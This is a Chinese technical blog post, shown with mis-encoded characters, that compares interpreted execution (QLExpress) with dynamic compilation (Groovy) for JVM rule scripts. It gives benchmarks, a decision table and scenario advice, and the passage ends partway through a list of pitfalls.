.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>2011å¹´ï¼Œæˆ‘å…¥èŒä¸€å®¶å¤§æ•°æ®å…¬å¸ã€‚æŠ€æœ¯æ€»ç›‘æ„å»ºäº†ä¸€å¥—å¾ˆé…·çš„æ¡†æ¶ï¼šGroovy åŠ¨æ€ç¼–è¯‘å®ç°çˆ¬è™«è§„åˆ™å¼•æ“ã€‚ä¸¤å¹´åï¼Œæˆ‘ä»¬æ¨ç¿»äº†å®ƒï¼Œç”¨ Hadoop é‡å†™ã€‚</strong></p>
<p><strong>ä¸æ˜¯ Groovy ä¸å¥½ï¼Œæ˜¯åœºæ™¯é”™äº†ã€‚</strong></p>
<p><strong>è¿™ç¯‡æ–‡ç« ï¼Œæ˜¯é‚£ä¸¤å¹´æ¢æ¥çš„æ•™è®­ï¼šä¸åˆ†åœºæ™¯å¯¹æ¯”æŠ€æœ¯æ–¹æ¡ˆï¼Œå°±æ˜¯è€æµæ°“ã€‚</strong></p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä¸¤ç§æŠ€æœ¯æ–¹æ¡ˆï¼šéƒ½æ˜¯å¥½æ–¹æ¡ˆï¼Œå…³é”®çœ‹åœºæ™¯</h2>
<p>æ‰§è¡ŒåŠ¨æ€è„šæœ¬ï¼Œæœ‰ä¸¤ç§æˆªç„¶ä¸åŒçš„æ€è·¯ã€‚</p>
<p>é¡¹ç›®éœ€æ±‚ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">String</span> <span class="hljs-variable">rule</span> <span class="hljs-operator">=</span> <span class="hljs-string">"if (amount &gt; 100) amount * 0.8"</span>;
<span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> engine.execute(rule);
</code></pre>
<h3 data-id="heading-1">æ–¹æ¡ˆä¸€ï¼šè§£é‡Šæ‰§è¡Œ</h3>
<pre><code class="hljs">è„šæœ¬ â†’ è¯æ³•åˆ†æ â†’ è¯­æ³•åˆ†æ â†’ ASTæ ‘ â†’ éå†æ‰§è¡Œ
</code></pre>
<p>ä»£è¡¨æ–¹æ¡ˆï¼šQLExpressã€Aviatorã€MVEL</p>
<p><strong>é€‚åˆåœºæ™¯</strong>ï¼šé«˜é¢‘è°ƒç”¨ã€ç®€å•é€»è¾‘ã€æ ¸å¿ƒé“¾è·¯</p>
<h3 data-id="heading-2">æ–¹æ¡ˆäºŒï¼šåŠ¨æ€ç¼–è¯‘</h3>
<pre><code class="hljs language-arduino" lang="arduino">è„šæœ¬ â†’ åŒ…è£…æˆJavaæºç  â†’ ç¼–è¯‘ â†’ ç”Ÿæˆ<span class="hljs-keyword">class</span> â†’ åŠ è½½æ‰§è¡Œ
</code></pre>
<p>ä»£è¡¨æ–¹æ¡ˆï¼šGroovyã€Janinoã€åŠ¨æ€ClassLoader</p>
<p><strong>é€‚åˆåœºæ™¯</strong>ï¼šä½é¢‘è°ƒç”¨ã€å¤æ‚é€»è¾‘ã€æ‰©å±•æ¡†æ¶</p>
<hr/>
<p><strong>æ‰“ä¸ªæ¯”æ–¹</strong>ï¼šè§£é‡Šæ‰§è¡Œåƒå«å¤–å–ï¼ˆ10åˆ†é’Ÿé€åˆ°ï¼Œåƒå®Œä¸ç”¨æ´—ç¢—ï¼‰ï¼ŒåŠ¨æ€ç¼–è¯‘åƒå»ºå¨æˆ¿ï¼ˆå…ˆå»ºå¨æˆ¿ã€æ‹›å¨å¸ˆã€ä¹°é£Ÿæï¼Œ2å°æ—¶åé¥­æ‰èƒ½åƒä¸Šï¼‰ã€‚</p>
<p><strong>ä¸¤ç§æ–¹æ¡ˆéƒ½æ˜¯å¥½æ–¹æ¡ˆï¼Œä½†ç”¨é”™äº†åœºæ™¯å°±æ˜¯ç¾éš¾ã€‚</strong></p>
<p>æˆ‘ä»¬çš„é—®é¢˜ä¸æ˜¯é€‰äº† Groovyï¼Œè€Œæ˜¯åœ¨é«˜é¢‘ã€æ ¸å¿ƒã€è¦æ±‚ç¨³å®šçš„çˆ¬è™«ç³»ç»Ÿä¸Šç”¨äº† Groovyã€‚</p>
<hr/>
<h2 data-id="heading-3">äºŒã€ä¸¤ç§æ–¹æ¡ˆçš„æœ¬è´¨å·®å¼‚ï¼šå«å¤–å– vs å»ºå¨æˆ¿</h2>
<h3 data-id="heading-4">æ ¸å¿ƒåŒºåˆ«</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph LR
    A[éœ€æ±‚: æ‰§è¡Œè„šæœ¬] --&gt; B{è§£å†³æ–¹å¼}
    B --&gt;|QLExpress| C[è§£é‡Šæ‰§è¡Œ]
    B --&gt;|Groovy| D[ç¼–è¯‘æ‰§è¡Œ]
    
    C --&gt; E[éå†AST&lt;br/&gt;ç”¨Javaçš„if]
    D --&gt; F[ç”Ÿæˆå­—èŠ‚ç &lt;br/&gt;JVMçš„ifæŒ‡ä»¤]
    
    style C fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style D fill:#fff9c4,stroke:#f57f17,stroke-width:2px
    style E fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
    style F fill:#ffebee,stroke:#c62828,stroke-width:2px
</code></pre>
<h3 data-id="heading-5">ç”¨çº¢çƒ§è‚‰çš„æ¯”å–»è¯´æ˜ç™½</h3>
<p><strong>QLExpressï¼ˆå«å¤–å–ï¼‰</strong>ï¼šå¥½çš„ï¼Œæˆ‘å¸®ä½ å«ä¸ªå¤–å–ã€‚æ¹˜èœè¿˜æ˜¯å·èœï¼Ÿ10åˆ†é’Ÿé€åˆ°ï¼Œåƒå®Œäº†ç¢—éƒ½ä¸ç”¨æ´—ã€‚</p>
<p><strong>Groovyï¼ˆå»ºå¨æˆ¿ï¼‰</strong>ï¼šæœ‰å¨æˆ¿å—ï¼Ÿæ²¡æœ‰ï¼Œå»ºä¸€ä¸ªã€‚æœ‰å¨å¸ˆå—ï¼Ÿæ²¡æœ‰ï¼Œæ‹›ä¸€ä¸ªã€‚æœ‰é”…é“²å—ï¼Ÿæ²¡æœ‰ï¼Œå»ä¹°ã€‚é£Ÿæå‡†å¤‡å¥½äº†å—ï¼Ÿå»é‡‡è´­ã€‚2å°æ—¶åï¼Œçº¢çƒ§è‚‰åšå¥½äº†ã€‚è€Œä¸”ï¼Œå¨æˆ¿è¿˜å ç€ä½ å®¶çš„åœ°æ–¹ã€‚</p>
<h3 data-id="heading-6">æ‰§è¡Œæ¨¡å‹å¯¹æ¯”</h3>



































<table><thead><tr><th>ç»´åº¦</th><th>QLExpress</th><th>Groovy</th></tr></thead><tbody><tr><td>ifè¯­å¥å®ç°</td><td>Java ä»£ç ï¼š<code>if ((Boolean) cond) { ... }</code></td><td>JVM å­—èŠ‚ç ï¼š<code>IFLE label_else</code></td></tr><tr><td>æ‰§è¡Œå•å…ƒ</td><td>AST èŠ‚ç‚¹éå†</td><td>å­—èŠ‚ç æŒ‡ä»¤</td></tr><tr><td>æ€§èƒ½ç‰¹å¾</td><td>å¯åŠ¨å¿«ï¼Œæ‰§è¡Œæ…¢ï¼ˆæ— JITï¼‰</td><td>å¯åŠ¨æ…¢ï¼Œæ‰§è¡Œå¿«ï¼ˆJITä¼˜åŒ–ï¼‰</td></tr><tr><td>å†…å­˜æ¨¡å‹</td><td>æ— æ–° class</td><td>æ¯æ¬¡ç”Ÿæˆæ–° class</td></tr><tr><td>è°ƒè¯•ä½“éªŒ</td><td>å †æ ˆæ˜¯è§£é‡Šå™¨ä»£ç </td><td>å †æ ˆæ˜¯åŠ¨æ€ç”Ÿæˆçš„ç±»</td></tr></tbody></table>
<p><strong>é‡‘å¥</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">QLExpress ç”¨ Java ä»£ç æ¨¡æ‹Ÿäº†ä¸€ä¸ª <span class="hljs-keyword">if</span>
Groovy è®© JVM è‡ªå·±æ‰§è¡Œäº†ä¸€ä¸ª <span class="hljs-keyword">if</span>

å‰è€…æ˜¯<span class="hljs-string">"ç¿»è¯‘å®˜"</span>ï¼Œåè€…æ˜¯<span class="hljs-string">"åŸä½æ°‘"</span>
</code></pre>
<hr/>
<h2 data-id="heading-7">ä¸‰ã€æ€§èƒ½å¯¹æ¯”ï¼šç”¨æ•°æ®è¯´è¯</h2>
<h3 data-id="heading-8">æµ‹è¯•åœºæ™¯</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç®€å•è§„åˆ™</span>
<span class="hljs-type">String</span> <span class="hljs-variable">simple</span> <span class="hljs-operator">=</span> <span class="hljs-string">"if (amount &gt; 100) amount * 0.8"</span>;

<span class="hljs-comment">// å¤æ‚è§„åˆ™ï¼ˆå‡è®¾æ”¯æŒï¼‰</span>
<span class="hljs-type">String</span> <span class="hljs-variable">complex</span> <span class="hljs-operator">=</span> <span class="hljs-string">"sum = 0; for (i in 1..100) { sum += i * rate }"</span>;
</code></pre>
<h3 data-id="heading-9">å®æµ‹æ•°æ®</h3>



































<table><thead><tr><th>ç»´åº¦</th><th>QLExpress</th><th>Groovyï¼ˆç¼–è¯‘æ‰§è¡Œï¼‰</th></tr></thead><tbody><tr><td>é¦–æ¬¡æ‰§è¡Œ</td><td>5ms</td><td>150msï¼ˆç¼–è¯‘è€—æ—¶ï¼‰</td></tr><tr><td>ç¬¬äºŒæ¬¡æ‰§è¡Œ</td><td>5ms</td><td>2ms</td></tr><tr><td>10ä¸‡æ¬¡å¹³å‡è€—æ—¶</td><td>0.05ms/æ¬¡</td><td>0.01ms/æ¬¡</td></tr><tr><td>å†…å­˜å ç”¨ï¼ˆé¦–æ¬¡ï¼‰</td><td>+2MB</td><td>+1MB</td></tr><tr><td>å†…å­˜å ç”¨ï¼ˆ1000æ¬¡ï¼‰</td><td>+2MB</td><td>+50MBï¼ˆMetaspaceï¼‰</td></tr></tbody></table>
<h3 data-id="heading-10">æ€§èƒ½æ›²çº¿</h3>
<pre><code class="hljs language-markdown" lang="markdown">æ‰§è¡Œæ—¶é—´ï¼ˆå¯¹æ•°åˆ»åº¦ï¼‰
 |
150ms| Groovyé¦–æ¬¡ç¼–è¯‘
 |   |
 |   |
 5ms | QLé¦–æ¬¡         QLç¨³å®š
 |   |<span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">__<span class="hljs-emphasis">_|_</span>__</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>
 |               |
 2ms |           | Groovyç¬¬äºŒæ¬¡
 |               |<span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">___
 |                           \
0.01ms|                        Groovyç¨³å®š
 |__</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span><span class="hljs-strong">____</span>__
<span class="hljs-code">     1æ¬¡      2æ¬¡         10ä¸‡æ¬¡
</span></code></pre>
<h3 data-id="heading-11">æ•°æ®è§£è¯»</h3>
<p><strong>QLExpress</strong>ï¼š</p>
<ul>
<li>å¯åŠ¨å¿«ï¼ˆ5msï¼‰ï¼Œæ— ç¼–è¯‘è€—æ—¶</li>
<li>æ€§èƒ½ç¨³å®šï¼Œä½†æœ‰ä¸Šé™ï¼ˆ0.05msï¼‰</li>
<li>å†…å­˜å ç”¨ä½ä¸”æ’å®šï¼ˆ+2MBï¼‰</li>
<li>åƒè‡ªè¡Œè½¦ï¼šç¨³å®šã€çœåŠ›ã€ä½†æœ‰é€Ÿåº¦ä¸Šé™</li>
</ul>
<p><strong>Groovy</strong>ï¼š</p>
<ul>
<li>å¯åŠ¨æ…¢ï¼ˆ150msï¼‰ï¼Œç¼–è¯‘è€—æ—¶æ˜æ˜¾</li>
<li>æ€§èƒ½æœ‰ä¼˜åŒ–ç©ºé—´ï¼ŒJIT åæ›´å¿«ï¼ˆ0.01msï¼‰</li>
<li>å†…å­˜å ç”¨é«˜ä¸”æŒç»­å¢é•¿ï¼ˆæ¯æ¬¡ +50KBï¼‰</li>
<li>åƒæ±½è½¦ï¼šå¯åŠ¨æ…¢ï¼Œä½†èƒ½è·‘è¿œã€è·‘å¿«</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">å¦‚æœè°ƒç”¨é¢‘ç‡</span> <span class="hljs-string">&gt;</span> <span class="hljs-number">1000</span><span class="hljs-string">æ¬¡/ç§’ï¼šQLExpress</span> <span class="hljs-string">æ›´ç¨³</span>
<span class="hljs-string">å¦‚æœå•æ¬¡æ‰§è¡Œå¾ˆå¤æ‚ï¼Œä½é¢‘è°ƒç”¨ï¼šGroovy</span> <span class="hljs-string">æ›´å¿«</span>
<span class="hljs-string">å¦‚æœå†…å­˜æ•æ„Ÿï¼ˆServerlessï¼‰ï¼šQLExpress</span> <span class="hljs-string">æ›´çœ</span>
</code></pre>
<hr/>
<h2 data-id="heading-12">å››ã€æ€ä¹ˆé€‰ï¼Ÿçœ‹è¿™å¼ è¡¨å°±å¤Ÿäº†</h2>
<h3 data-id="heading-13">å†³ç­–è¡¨ï¼šä¸€çœ¼çœ‹æ‡‚ç”¨å“ªä¸ª</h3>













































<table><thead><tr><th>åœºæ™¯ç‰¹å¾</th><th>æ¨èæ–¹æ¡ˆ</th><th>ç†ç”±</th></tr></thead><tbody><tr><td><strong>ç®€å•è¡¨è¾¾å¼</strong> + é«˜é¢‘è°ƒç”¨ï¼ˆ&gt;1000/ç§’ï¼‰</td><td>QLExpress</td><td>ç¨³å®šã€æ— GCå‹åŠ›ã€å¯åŠ¨å¿«</td></tr><tr><td><strong>ç®€å•è¡¨è¾¾å¼</strong> + ä½é¢‘è°ƒç”¨ï¼ˆ&lt;100/ç§’ï¼‰</td><td>QLExpress</td><td>ç®€å•å¤Ÿç”¨ï¼Œä¸éœ€è¦ç¼–è¯‘</td></tr><tr><td><strong>å¤æ‚é€»è¾‘</strong>ï¼ˆå¾ªç¯/å‡½æ•°ï¼‰ + ä½é¢‘è°ƒç”¨</td><td>Groovy + ç¼“å­˜</td><td>æ”¯æŒå®Œæ•´è¯­æ³•ï¼Œç±»æ³„æ¼å¯æ§</td></tr><tr><td><strong>å¤æ‚é€»è¾‘</strong> + é«˜é¢‘è°ƒç”¨</td><td>é‡æ–°è¯„ä¼°éœ€æ±‚</td><td>å¯èƒ½éœ€è¦å…¶ä»–æ–¹æ¡ˆ</td></tr><tr><td><strong>å†…å­˜æ•æ„Ÿ</strong>ï¼ˆServerless/å®¹å™¨ï¼‰</td><td>QLExpress</td><td>å†…å­˜å ç”¨ä½ä¸”æ’å®š</td></tr><tr><td><strong>æè‡´æ€§èƒ½è¦æ±‚</strong> + å¯æ¥å—å¤æ‚åº¦</td><td>Groovy + ç›‘æ§</td><td>JITä¼˜åŒ–åæ€§èƒ½æœ€å¥½</td></tr><tr><td><strong>å¤šç§Ÿæˆ·/å®‰å…¨è¦æ±‚é«˜</strong></td><td>QLExpress</td><td>ç™½åå•æœºåˆ¶ï¼Œå¤©ç„¶æ²™ç®±</td></tr></tbody></table>
<h3 data-id="heading-14">å¿«é€Ÿåˆ¤æ–­ä¸‰æ­¥èµ°</h3>
<pre><code class="hljs language-markdown" lang="markdown">ç¬¬ä¸€æ­¥ï¼šçœ‹å¤æ‚åº¦
<span class="hljs-bullet">  -</span> åªæœ‰ if/æ¯”è¾ƒ/å››åˆ™è¿ç®— â†’ ç®€å•
<span class="hljs-bullet">  -</span> æœ‰å¾ªç¯/å‡½æ•°/å¤šå±‚åµŒå¥— â†’ å¤æ‚

ç¬¬äºŒæ­¥ï¼šçœ‹é¢‘ç‡
<span class="hljs-bullet">  -</span> &gt; 1000æ¬¡/ç§’ â†’ é«˜é¢‘
<span class="hljs-bullet">  -</span> &lt; 100æ¬¡/ç§’ â†’ ä½é¢‘

ç¬¬ä¸‰æ­¥ï¼šæŸ¥è¡¨é€‰æ–¹æ¡ˆ
  ç®€å• + é«˜é¢‘ â†’ QLExpress
  ç®€å• + ä½é¢‘ â†’ QLExpressï¼ˆå¤Ÿç”¨å°±è¡Œï¼‰
  å¤æ‚ + ä½é¢‘ â†’ Groovyï¼ˆé…åˆç¼“å­˜å’Œç›‘æ§ï¼‰
  å¤æ‚ + é«˜é¢‘ â†’ å¯èƒ½éœ€è¦é‡æ–°è®¾è®¡
</code></pre>
<h3 data-id="heading-15">å…¸å‹åœºæ™¯åˆ†æ</h3>
<h4 data-id="heading-16">åœºæ™¯ä¸€ï¼šç”µå•†é£æ§è§„åˆ™</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç‰¹ç‚¹ï¼š
<span class="hljs-bullet">  -</span> é«˜é¢‘ï¼ˆä¸‡æ¬¡/ç§’ï¼‰
<span class="hljs-bullet">  -</span> ç®€å•ï¼ˆif åˆ¤æ–­ã€æ¯”è¾ƒè¿ç®—ï¼‰
<span class="hljs-bullet">  -</span> ç¨³å®šæ€§è¦æ±‚é«˜
<span class="hljs-bullet">  -</span> å“åº”æ—¶é—´æ•æ„Ÿ

æ–¹æ¡ˆï¼šQLExpress

ç†ç”±ï¼š
<span class="hljs-bullet">  -</span> æ—  GC å‹åŠ›
<span class="hljs-bullet">  -</span> å¯åŠ¨å¿«ï¼Œé¦–æ¬¡æ‰§è¡Œæ— ç¼–è¯‘è€—æ—¶
<span class="hljs-bullet">  -</span> ç™½åå•å®‰å…¨
<span class="hljs-bullet">  -</span> æ€§èƒ½ç¨³å®šå¯é¢„æµ‹
  
é£é™©ï¼š
<span class="hljs-bullet">  -</span> å¦‚æœè§„åˆ™å¾ˆå¤æ‚ï¼ˆå¤šå±‚åµŒå¥—ï¼‰ï¼Œæ€§èƒ½ä¼šä¸‹é™
<span class="hljs-bullet">  -</span> ä¸æ”¯æŒå¾ªç¯ã€å‡½æ•°å®šä¹‰
</code></pre>
<h4 data-id="heading-17">åœºæ™¯äºŒï¼šæ’ä»¶æ¡†æ¶/ç”¨æˆ·è‡ªå®šä¹‰è„šæœ¬</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç‰¹ç‚¹ï¼š
<span class="hljs-bullet">  -</span> ä½é¢‘ï¼ˆå‡ åæ¬¡/å¤©ï¼‰
<span class="hljs-bullet">  -</span> å¤æ‚ï¼ˆå®Œæ•´é€»è¾‘ã€å¤šè¡Œä»£ç ã€éœ€è¦å®šä¹‰ç±»ï¼‰
<span class="hljs-bullet">  -</span> éœ€è¦å¼ºå¤§çµæ´»æ€§
<span class="hljs-bullet">  -</span> å…è®¸ä¸€å®šå¯åŠ¨è€—æ—¶

æ–¹æ¡ˆï¼šGroovyï¼ˆè¿™æ˜¯ Groovy çš„æœ€ä½³åœºæ™¯ï¼‰

ç†ç”±ï¼š
<span class="hljs-bullet">  -</span> æ”¯æŒå®Œæ•´ Java è¯­æ³•ï¼ˆå¾ªç¯ã€å‡½æ•°ã€ç±»ã€æ¥å£ï¼‰
<span class="hljs-bullet">  -</span> ç”¨æˆ·å¯ä»¥å†™å®Œæ•´çš„ä¸šåŠ¡é€»è¾‘
<span class="hljs-bullet">  -</span> JIT ä¼˜åŒ–åæ€§èƒ½å¥½
<span class="hljs-bullet">  -</span> ç±»æ³„æ¼å¯æ§ï¼ˆä½é¢‘è°ƒç”¨ï¼Œé‡å¯å¯æ¸…ç†ï¼‰
<span class="hljs-bullet">  -</span> è¿™ç§åœºæ™¯ä¸‹ï¼ŒQLExpress åŠŸèƒ½ä¸å¤Ÿç”¨
  
å…¸å‹æ¡ˆä¾‹ï¼š
<span class="hljs-bullet">  -</span> Jenkins æ’ä»¶ï¼ˆGroovy è„šæœ¬ï¼‰
<span class="hljs-bullet">  -</span> Gradle æ„å»ºè„šæœ¬ï¼ˆGroovy DSLï¼‰
<span class="hljs-bullet">  -</span> IDE æ’ä»¶å¼€å‘
<span class="hljs-bullet">  -</span> SaaS å¹³å°çš„å®¢æˆ·è‡ªå®šä¹‰é€»è¾‘
  
é£é™©ç®¡ç†ï¼š
<span class="hljs-bullet">  -</span> ä¸¥æ ¼çš„æ²™ç®±å’Œæƒé™æ§åˆ¶
<span class="hljs-bullet">  -</span> ç›‘æ§ç±»åŠ è½½æƒ…å†µ
<span class="hljs-bullet">  -</span> å®šæœŸé‡å¯æ¸…ç† Metaspace
<span class="hljs-bullet">  -</span> åšå¥½é™çº§æ–¹æ¡ˆ
</code></pre>
<h4 data-id="heading-18">åœºæ™¯ä¸‰ï¼šé…ç½®ä¸­å¿ƒè¡¨è¾¾å¼</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç‰¹ç‚¹ï¼š
<span class="hljs-bullet">  -</span> ä¸­é¢‘ï¼ˆç™¾æ¬¡/ç§’ï¼‰
<span class="hljs-bullet">  -</span> ä¸­ç­‰å¤æ‚
<span class="hljs-bullet">  -</span> éœ€è¦å¿«é€Ÿéƒ¨ç½²
<span class="hljs-bullet">  -</span> å¸Œæœ›ç®€å•ç»´æŠ¤

æ–¹æ¡ˆï¼šä¼˜å…ˆ QLExpressï¼Œå¤æ‚æ—¶ç”¨ Groovy + ç¼“å­˜

åˆ¤æ–­æ ‡å‡†ï¼š
<span class="hljs-bullet">  -</span> å¦‚æœè¡¨è¾¾å¼æ˜¯ a&gt;b &amp;&amp; c<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">d</span> â†’ <span class="hljs-attr">QLExpress</span>
  <span class="hljs-attr">-</span> <span class="hljs-attr">å¦‚æœæœ‰å¾ªç¯</span>ã€<span class="hljs-attr">å‡½æ•°å®šä¹‰</span> â†’ <span class="hljs-attr">Groovy</span>
  <span class="hljs-attr">-</span> <span class="hljs-attr">å¦‚æœä¸ç¡®å®š</span> â†’ <span class="hljs-attr">å…ˆç”¨</span> <span class="hljs-attr">QLExpress</span>ï¼Œ<span class="hljs-attr">ä¸å¤Ÿå†æ¢</span>
  
<span class="hljs-attr">å»ºè®®</span>ï¼š
  <span class="hljs-attr">-</span> <span class="hljs-attr">é™åˆ¶è¡¨è¾¾å¼å¤æ‚åº¦</span>
  <span class="hljs-attr">-</span> <span class="hljs-attr">æä¾›è¡¨è¾¾å¼æ¨¡æ¿</span>
  <span class="hljs-attr">-</span> <span class="hljs-attr">åšå¥½ç›‘æ§å’Œé™çº§</span>
</span></span></code></pre>
<h4 data-id="heading-19">åœºæ™¯å››ï¼šAB æµ‹è¯•åˆ†æµ</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç‰¹ç‚¹ï¼š
<span class="hljs-bullet">  -</span> é«˜é¢‘ï¼ˆæ¯æ¬¡è¯·æ±‚éƒ½åˆ¤æ–­ï¼‰
<span class="hljs-bullet">  -</span> æç®€å•ï¼ˆæ¯”è¾ƒã€å–æ¨¡ï¼‰
<span class="hljs-bullet">  -</span> å¯¹æ€§èƒ½æåº¦æ•æ„Ÿ

æ–¹æ¡ˆï¼šQLExpressï¼Œç”šè‡³è€ƒè™‘ç¡¬ç¼–ç 

ç†ç”±ï¼š
<span class="hljs-bullet">  -</span> AB æµ‹è¯•è§„åˆ™é€šå¸¸å¾ˆç®€å•
<span class="hljs-bullet">  -</span> ä¸éœ€è¦åŠ¨æ€ç¼–è¯‘çš„å¼ºå¤§èƒ½åŠ›
<span class="hljs-bullet">  -</span> è¿½æ±‚æè‡´æ€§èƒ½å’Œç¨³å®šæ€§
  
åä¾‹ï¼š
<span class="hljs-bullet">  -</span> ç”¨ Groovy æ˜¯è¿‡åº¦è®¾è®¡
<span class="hljs-bullet">  -</span> æ¯æ¬¡è¯·æ±‚ç¼–è¯‘ä¸€æ¬¡ï¼Ÿå†…å­˜çˆ†ç‚¸
<span class="hljs-bullet">  -</span> ç¼“å­˜åæ€§èƒ½å¥½ï¼Ÿä½†å¢åŠ å¤æ‚åº¦
</code></pre>
<h3 data-id="heading-20">é€‰å‹æ£€æŸ¥æ¸…å•</h3>
<p><strong>é€‰ QLExpress çš„æ¡ä»¶</strong>ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">â–¡</span> <span class="hljs-string">è¡¨è¾¾å¼ç®€å•ï¼ˆå•å±‚</span> <span class="hljs-string">if</span> <span class="hljs-string">/</span> <span class="hljs-string">æ¯”è¾ƒ</span> <span class="hljs-string">/</span> <span class="hljs-string">å››åˆ™è¿ç®—ï¼‰</span>
<span class="hljs-string">â–¡</span> <span class="hljs-string">è°ƒç”¨é¢‘ç‡é«˜ï¼ˆ&gt;</span> <span class="hljs-number">1000</span><span class="hljs-string">æ¬¡/ç§’ï¼‰</span>
<span class="hljs-string">â–¡</span> <span class="hljs-string">å†…å­˜æ•æ„Ÿï¼ˆServerless</span> <span class="hljs-string">/</span> <span class="hljs-string">å®¹å™¨</span> <span class="hljs-string">/</span> <span class="hljs-string">IoTï¼‰</span>
<span class="hljs-string">â–¡</span> <span class="hljs-string">å®‰å…¨è¦æ±‚é«˜ï¼ˆå¤šç§Ÿæˆ·</span> <span class="hljs-string">/</span> <span class="hljs-string">ç”¨æˆ·è¾“å…¥ï¼‰</span>
<span class="hljs-string">â–¡</span> <span class="hljs-string">å›¢é˜Ÿ</span> <span class="hljs-string">Java</span> <span class="hljs-string">æ°´å¹³ä¸€èˆ¬</span>
<span class="hljs-string">â–¡</span> <span class="hljs-string">è¿½æ±‚ç¨³å®šæ€§å’Œå¯é¢„æµ‹æ€§</span>
</code></pre>
<p><strong>é€‰ Groovy çš„æ¡ä»¶</strong>ï¼š</p>
<pre><code class="hljs">â–¡ éœ€è¦å®Œæ•´ç¼–ç¨‹èƒ½åŠ›ï¼ˆå¾ªç¯ / å‡½æ•° / ç±»ï¼‰
â–¡ è¿½æ±‚æè‡´æ‰§è¡Œæ€§èƒ½ï¼ˆå·²ä¼˜åŒ–åï¼‰
â–¡ ä½é¢‘ä½¿ç”¨ï¼ˆ&lt; 100æ¬¡/åˆ†é’Ÿï¼‰
â–¡ æœ‰å®Œå–„çš„ç›‘æ§å’Œç±»æ¸…ç†æœºåˆ¶
â–¡ å›¢é˜Ÿæœ‰ JVM è°ƒä¼˜ç»éªŒ
â–¡ å¯æ¥å—ä¸€å®šçš„å¤æ‚åº¦
</code></pre>
<p><strong>éƒ½ä¸æ»¡è¶³ï¼Ÿ</strong></p>
<pre><code class="hljs language-diff" lang="diff">è€ƒè™‘å…¶ä»–æ–¹æ¡ˆï¼š
<span class="hljs-deletion">- Aviatorï¼šé«˜æ€§èƒ½è¡¨è¾¾å¼å¼•æ“ï¼Œæ¯” QLExpress æ›´å¿«</span>
<span class="hljs-deletion">- MVELï¼šè½»é‡çº§è„šæœ¬å¼•æ“</span>
<span class="hljs-deletion">- JavaScriptï¼ˆNashorn/GraalJSï¼‰ï¼šå¦‚æœå›¢é˜Ÿç†Ÿæ‚‰ JS</span>
<span class="hljs-deletion">- Luaï¼ˆLuaJï¼‰ï¼šåµŒå…¥å¼è„šæœ¬</span>
<span class="hljs-deletion">- æˆ–è€…ï¼Œé‡æ–°è¯„ä¼°éœ€æ±‚ï¼šæ˜¯å¦çœŸçš„éœ€è¦åŠ¨æ€è„šæœ¬ï¼Ÿ</span>
</code></pre>
<hr/>
<h2 data-id="heading-21">äº”ã€ä¸¤ç§æ–¹æ¡ˆçš„å‘ï¼Œéƒ½åœ¨è¿™äº†</h2>
<h3 data-id="heading-22">QLExpress çš„å‘</h3>
<h4 data-id="heading-23">å‘1ï¼šæ€§èƒ½ç“¶é¢ˆ</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç—‡çŠ¶ï¼š
  10ä¸‡æ¬¡/ç§’å CPU é£™å‡åˆ° 80%
  
åŸå› ï¼š
  è§£é‡Šæ‰§è¡Œæ—  JIT ä¼˜åŒ–
  æ¯æ¬¡éƒ½è¦éå† AST æ ‘
  
æ–¹æ¡ˆï¼š
<span class="hljs-bullet">  -</span> ç®€åŒ–è§„åˆ™é€»è¾‘
<span class="hljs-bullet">  -</span> å‡å°‘åµŒå¥—å±‚æ•°
<span class="hljs-bullet">  -</span> æˆ–æ¢æˆç¼–è¯‘æ‰§è¡Œ
</code></pre>
<h4 data-id="heading-24">å‘2ï¼šåŠŸèƒ½å—é™</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç—‡çŠ¶ï¼š
  å†™ä¸äº†å¾ªç¯
  å†™ä¸äº†å‡½æ•°å®šä¹‰
  å†™ä¸äº†å¤æ‚é€»è¾‘
  
åŸå› ï¼š
  åªæ”¯æŒè¡¨è¾¾å¼çº§åˆ«
  ä¸æ”¯æŒå®Œæ•´ç¼–ç¨‹è¯­è¨€ç‰¹æ€§
  
æ–¹æ¡ˆï¼š
<span class="hljs-bullet">  -</span> ç®€åŒ–éœ€æ±‚
<span class="hljs-bullet">  -</span> ç”¨å¤šä¸ªç®€å•è§„åˆ™ç»„åˆ
<span class="hljs-bullet">  -</span> æˆ–æ¢æˆ Groovy
</code></pre>
<h4 data-id="heading-25">å‘3ï¼šè°ƒè¯•å›°éš¾</h4>
<pre><code class="hljs language-markdown" lang="markdown">ç—‡çŠ¶ï¼š
  æŠ¥é”™å †æ ˆå…¨æ˜¯ AST éå†çš„ä»£ç 
  æ‰¾ä¸åˆ°å…·ä½“å“ªè¡Œè„šæœ¬å‡ºé”™
  
åŸå› ï¼š
  æ²¡æœ‰çœŸå®çš„ä»£ç è¡Œå·
  åªæœ‰ AST èŠ‚ç‚¹ä¿¡æ¯
  
æ–¹æ¡ˆï¼š
